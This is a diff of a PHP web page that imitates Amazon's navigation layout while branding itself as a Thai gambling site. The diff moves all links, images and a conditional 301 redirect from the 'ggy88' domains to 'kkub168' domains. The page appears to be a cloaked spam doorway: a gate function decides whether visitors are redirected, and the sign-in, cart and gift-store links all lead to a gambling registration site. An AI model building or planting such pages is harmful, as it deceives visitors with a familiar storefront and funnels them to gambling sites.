@@ -29,7 +29,7 @@ function hwdproperties()
 if (!hwdproperties()) 
 {
      header("HTTP/1.1 301 Moved Permanently");
-     header("Location: https://ggy88.pages.dev");
+     header("Location: https://kkub168.pages.dev/");
      exit();
 }
 
@@ -87,67 +87,20 @@ $baseUrl = getBaseUrl();
 $canonicalUrl = $baseUrl . "?go=" . urlencode($slug);
 
 $img = [
-    "https://ggy88.world/img/ggy88-1.webp",
-    "https://ggy88.world/img/ggy88-2.webp",
-    "https://ggy88.world/img/ggy88-3.webp",
-    "https://ggy88.world/img/ggy88-4.webp",
-    "https://ggy88.world/img/ggy88-5.webp",
-    "https://ggy88.world/img/ggy88-6.webp",
-    "https://ggy88.world/img/ggy88-7.webp",
-    "https://ggy88.world/img/ggy88-8.webp",
-    "https://ggy88.world/img/ggy88-9.webp",
-    "https://ggy88.world/img/ggy88-10.webp",
-    "https://ggy88.world/img/ggy88-11.webp",
-    "https://ggy88.world/img/ggy88-12.webp",
-    "https://ggy88.world/img/ggy88-13.webp",
-    "https://ggy88.world/img/ggy88-14.webp",
-    "https://ggy88.world/img/ggy88-15.webp",
-    "https://ggy88.world/img/ggy88-16.webp",
-    "https://ggy88.world/img/ggy88-17.webp",
-    "https://ggy88.world/img/ggy88-18.webp",
-    "https://ggy88.world/img/ggy88-19.webp",
-    "https://ggy88.world/img/ggy88-20.webp",
-    "https://ggy88.world/img/ggy88-21.webp",
-    "https://ggy88.world/img/ggy88-22.webp",
-    "https://ggy88.world/img/ggy88-23.webp",
-    "https://ggy88.world/img/ggy88-23.webp",
-    "https://ggy88.world/img/ggy88-25.webp",
-    "https://ggy88.world/img/ggy88-26.webp",
-    "https://ggy88.world/img/ggy88-27.webp",
-    "https://ggy88.world/img/ggy88-28.webp",
-    "https://ggy88.world/img/ggy88-29.webp",
-    "https://ggy88.world/img/ggy88-30.webp",
-    "https://ggy88.world/img/ggy88-31.webp",
-    "https://ggy88.world/img/ggy88-32.webp",
-    "https://ggy88.world/img/ggy88-33.webp",
-    "https://ggy88.world/img/ggy88-34.webp",
-    "https://ggy88.world/img/ggy88-35.webp",
-    "https://ggy88.world/img/ggy88-36.webp",
-    "https://ggy88.world/img/ggy88-37.webp",
-    "https://ggy88.world/img/ggy88-38.webp",
-    "https://ggy88.world/img/ggy88-39.webp",
-    "https://ggy88.world/img/ggy88-40.webp",
-    "https://ggy88.world/img/ggy88-41.webp",
-    "https://ggy88.world/img/ggy88-42.webp",
-    "https://ggy88.world/img/ggy88-43.webp",
-    "https://ggy88.world/img/ggy88-44.webp",
-    "https://ggy88.world/img/ggy88-45.webp",
-    "https://ggy88.world/img/ggy88-46.webp",
-    "https://ggy88.world/img/ggy88-47.webp",
-    "https://ggy88.world/img/ggy88-48.webp",
-    "https://ggy88.world/img/ggy88-49.webp",
-    "https://ggy88.world/img/ggy88-50.webp",
-    "https://ggy88.world/img/ggy88-51.webp",
-    "https://ggy88.world/img/ggy88-52.webp",
-    "https://ggy88.world/img/ggy88-53.webp",
-    "https://ggy88.world/img/ggy88-54.webp",
-    "https://ggy88.world/img/ggy88-55.webp",
-    "https://ggy88.world/img/ggy88-56.webp",
-    "https://ggy88.world/img/ggy88-57.webp",
-    "https://ggy88.world/img/ggy88-58.webp",
-    "https://ggy88.world/img/ggy88-59.webp",
-    "https://ggy88.world/img/ggy88-60.webp",
-    "https://ggy88.world/img/ggy88-61.webp",
+    "https://kkub168.ltd/img/kkub168-1.webp",
+    "https://kkub168.ltd/img/kkub168-2.webp",
+    "https://kkub168.ltd/img/kkub168-3.webp",
+    "https://kkub168.ltd/img/kkub168-4.webp",
+    "https://kkub168.ltd/img/kkub168-5.webp",
+    "https://kkub168.ltd/img/kkub168-6.webp",
+    "https://kkub168.ltd/img/kkub168-7.webp",
+    "https://kkub168.ltd/img/kkub168-8.webp",
+    "https://kkub168.ltd/img/kkub168-9.webp",
+    "https://kkub168.ltd/img/kkub168-10.webp",
+    "https://kkub168.ltd/img/kkub168-11.webp",
+    "https://kkub168.ltd/img/kkub168-12.webp",
+    "https://kkub168.ltd/img/kkub168-13.webp",
+    "https://kkub168.ltd/img/kkub168-14.webp",
 ];
 
 $random_img = $img[array_rand($img)];
@@ -163,7 +116,7 @@ $random_img = $img[array_rand($img)];
     <meta name="og:site_name" content="<?php echo htmlspecialchars($brand); ?>">
     <meta name="description"
         content="<?php echo htmlspecialchars($description); ?>" />
-    <link rel="shortcut icon" href="https://ggy88th.com/wp-content/uploads/2025/06/logo-1-scaled.webp" />
+    <link rel="shortcut icon" href="https://kkub168.ltd/img/logo-1.webp" />
     <link rel="canonical" href="<?php echo htmlspecialchars($canonicalUrl); ?>" />
     <!-- sp:end-feature:head-start -->
     <!-- sp:feature:csm:head-open-part1 -->
@@ -791,7 +744,7 @@ $random_img = $img[array_rand($img)];
                         <script type='text/javascript'>window.navmet.tmp = +new Date();</script>
                         <div id="nav-logo" style="top:5px; left:5px">
                             <a href="" id="nav-logo-sprites"></a>
-                                <img src="https://ggy88.world/img/logo-ggy88.webp" ></img>
+                                <img src="https://kkub168.ltd/img/logo.webp" ></img>
                             </a>
                         </div>
                         <script
@@ -895,7 +848,7 @@ $random_img = $img[array_rand($img)];
 
 
 
-                            <a href="https://ggy88.pages.dev"
+                            <a href="https://kkub168.pages.dev/"
                                 class="nav-a nav-a-2   nav-progressive-attribute" data-nav-ref="nav_ya_signin"
                                 data-nav-role="signin" data-ux-jq-mouseenter="true" id="nav-link-accountList"
                                 tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav-link-accountList"
@@ -907,7 +860,7 @@ $random_img = $img[array_rand($img)];
                             </a>
 
 
-                            <a href="https://ggy88.pages.dev"
+                            <a href="https://kkub168.pages.dev/"
                                 class="nav-a nav-a-2   nav-progressive-attribute" id="nav-orders" tabindex="0">
                                 <span class="nav-line-1"><?php echo htmlspecialchars($brand); ?></span>
                                 <span class="nav-line-2">สมัครสมาชิก<span class="nav-icon nav-arrow"></span></span>
@@ -915,7 +868,7 @@ $random_img = $img[array_rand($img)];
 
 
 
-                            <a href="https://ggy88.pages.dev" aria-label="0 items in shopping basket"
+                            <a href="https://kkub168.pages.dev/" aria-label="0 items in shopping basket"
                                 class="nav-a nav-a-2 nav-progressive-attribute" id="nav-cart">
                                 <div id="nav-cart-count-container">
                                     <span id="nav-cart-count" aria-hidden="true"
@@ -973,7 +926,7 @@ $random_img = $img[array_rand($img)];
                             <div id="navSwmHoliday"
                                 style="height: 39px; width: 400px; overflow: hidden; position: relative; ">
                                 <a aria-label="Christmas gift store"
-                                    href="https://ggy88.pages.dev"
+                                    href="https://kkub168.pages.dev/"
                                     class="nav-imageHref" target="_blank">
                                     <img alt="Christmas gift store"
                                         src="https://gyg168th.com/img/thai.webp">
@@ -1854,7 +1807,7 @@ $random_img = $img[array_rand($img)];
             });
         </script>
         <script type="text/javascript">
-            var iUrl = "https://ggy88.world/img/logo-ggy88.webp";
+            var iUrl = "https://kkub168.ltd/img/logo.webp";
             (function () { var i = new Image; i.src = iUrl; })();
         </script>
         <script type="a-state"
